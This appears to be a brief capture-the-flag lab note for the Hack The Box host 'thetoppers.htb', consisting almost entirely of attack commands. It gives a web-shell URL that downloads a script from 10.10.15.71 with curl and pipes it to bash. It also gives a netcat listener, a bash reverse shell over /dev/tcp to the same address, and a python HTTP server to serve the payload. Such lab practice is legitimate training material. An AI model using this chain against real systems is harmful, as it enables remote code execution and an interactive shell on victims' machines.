## HTML Rogue File Serve

```sh
  http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.71:8000/shell.sh|bash
```

### Reverse shell Server
```sh
#create a listener for shell session
nc -nvlp 1337


#!/bin/bash
bash -i >& /dev/tcp/10.10.15.71/1337 0>&1

python3 -m http.server 8000

```

